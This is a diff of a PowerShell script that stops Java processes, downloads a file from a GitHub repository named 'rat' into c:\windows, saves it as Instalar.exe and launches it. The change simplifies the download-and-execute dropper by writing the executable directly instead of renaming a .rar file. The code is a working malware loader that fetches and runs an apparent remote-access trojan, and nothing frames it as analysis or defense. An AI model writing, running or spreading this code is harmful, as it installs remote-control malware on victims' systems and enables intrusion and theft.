@@ -22,23 +22,18 @@ if ($f3) {
    Stop-Process -processname Java
 }
 
-$url = "https://raw.githubusercontent.com/itarare/rat/master/Instalar.rar"
-$output = "c:\windows\Instalar.rar"
+$url = "https://raw.githubusercontent.com/itarare/rat/master/Instalar.txt"
+$output = "c:\windows\Instalar.exe"
 $start_time = Get-Date
 
 Invoke-WebRequest -Uri $url -OutFile $output
 Write-Output "[ $((Get-Date).Subtract($start_time).Seconds) ]"
 
-$fd = 'c:\windows\Instalar.rar'
 $wshell=New-Object -comObject Wscript.Shell
 
-if (Test-Path $fd) {
-   rename-item -path c:\windows\Instalar.rar -newname c:\windows\Instalar.exe   
-   Start-Sleep -s 1
-
-   $fs = 'c:\windows\Instalar.exe'
-   if (Test-Path $fs) {
-      Start-Process -FilePath $fs
+if (Test-Path $output) {
+   if (Test-Path $output) {
+      Start-Process -FilePath $output
 
       $r2 = Get-Process Instalar -ErrorAction SilentlyContinue
       #if ($r2) { 
